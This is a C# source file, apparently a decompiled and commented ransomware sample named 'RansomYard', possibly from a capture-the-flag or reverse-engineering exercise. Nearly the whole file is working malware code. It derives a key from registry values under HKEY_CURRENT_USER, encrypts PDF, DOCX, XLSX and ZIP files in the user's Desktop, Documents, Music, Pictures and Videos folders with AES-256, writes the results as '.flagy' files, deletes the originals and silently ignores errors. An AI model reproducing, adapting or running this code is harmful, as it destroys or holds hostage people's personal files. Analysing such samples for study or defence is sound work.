// RansomYard, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// RansomYard.RansomYardStart
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class RansomYardStart
{
	[STAThread]
	public static void main()
	{
		// Just getting the System Special folders
		string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string path2 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\";
		string path3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
		string path4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\";
		string path5 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\";

		// HKEY_CURRENT_USER
		RegistryKey currentUser = Registry.CurrentUser;
		// Retrieve all the subkeys for the specified key
		string[] subKeyNames = currentUser.GetSubKeyNames();
		// Retrieves the specified subkey
		RegistryKey registryKey = currentUser.OpenSubKey(subKeyNames[3]);
		// :P
		string text = "{";
		string text2 = "";
		// Retrieves an array of strings that contains all the value names for this key
		string[] valueNames = registryKey.GetValueNames();
		foreach (string text3 in valueNames)
		{
			// GetHash : Hash the string using MD5 
			text = text + GetHash(text3) + "-";
			text2 = text2 + text3 + "$";
		}
		string[] array = text2.Split('$');
		// foreach key we have hash its value
		foreach (string text4 in array)
		{
			if (text4.Length > 0)
			{
				text = text + GetHash(Conversions.ToString(registryKey.GetValue(text4))) + "-";
			}
		}
		text += "}";
		Encryptor(path, text + "1");
		Encryptor(path2, text + "2");
		Encryptor(path3, text + "3");
		Encryptor(path4, text + "4");
		Encryptor(path5, text + "5");
	}
	// MD5 STRING
	public static string GetHash(string theInput)
	{
		checked
		{
			using MD5 mD = MD5.Create();
			byte[] array = mD.ComputeHash(Encoding.UTF8.GetBytes(theInput));
			StringBuilder stringBuilder = new StringBuilder();
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(array[i].ToString("X2"));
			}
			return stringBuilder.ToString();
		}
	}

	// Get all files from this path
	public static string[] GetFiles(string path)
	{
		return Directory.GetFiles(path);
	}

	// :P
	public static void WriteFile(string path, string data)
	{
		File.WriteAllText(path + ".flagy", data);
	}

	// Where the fun begin
	public static void Encryptor(string path, string key)
	{
		try
		{
			string[] files = GetFiles(path);
			foreach (string text in files)
			{
				// Thankfully i don't have pdf, docx, xlsx or zip :)
				if (text.EndsWith(".pdf") | text.EndsWith(".docx") | text.EndsWith(".xlsx") | text.EndsWith(".zip"))
				{

					byte[] ba = Encrypt(File.ReadAllBytes(text), key);
					WriteFile(text, My_th(ba));
					File.Delete(text);
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] Encrypt(byte[] bytData, string strPass)
	{
		// RijndaelManaged is similar to AES...
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		// GetKey and GetIV we can reverse it but no need you'll see why in the patched version
		rijndaelManaged.Key = GeKey(strPass);
		rijndaelManaged.IV = GetIV(strPass);
		using MemoryStream memoryStream = new MemoryStream();
		byte[] result;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytData, 0, bytData.Length);
			cryptoStream.FlushFinalBlock();
			result = memoryStream.ToArray();
			cryptoStream.Close();
		}
		memoryStream.Close();
		return result;
	}

	private static byte[] GeKey(string strPass)
	{
		byte[] salt = new byte[8] { 3, 1, 3, 3, 3, 3, 3, 7 };
		byte[] password;
		using (SHA256Managed sHA256Managed = new SHA256Managed())
		{
			string text = Convert.ToBase64String(sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(strPass)));
			string s = strPass + text;
			password = sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(s));
			sHA256Managed.Clear();
		}
		return new Rfc2898DeriveBytes(password, salt, 1000).GetBytes(32);
	}

	private static byte[] GetIV(string strPass)
	{
		_ = new byte[8] { 3, 1, 3, 3, 3, 3, 3, 7 };
		using MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = Convert.ToBase64String(mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(strPass)));
		string s = strPass + text;
		byte[] result = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));
		mD5CryptoServiceProvider.Clear();
		return result;
	}

	public static string My_th(byte[] ba)
	{
		// Each file we encrypt it data will be in this fromat flagy{encryped(data) in hex}
		StringBuilder stringBuilder = new StringBuilder(checked(ba.Length * 2 + 7));
		stringBuilder.Append("flagy{");
		foreach (byte b in ba)
		{
			stringBuilder.AppendFormat("{0:x2}", b);
		}
		return stringBuilder.ToString();
	}
}
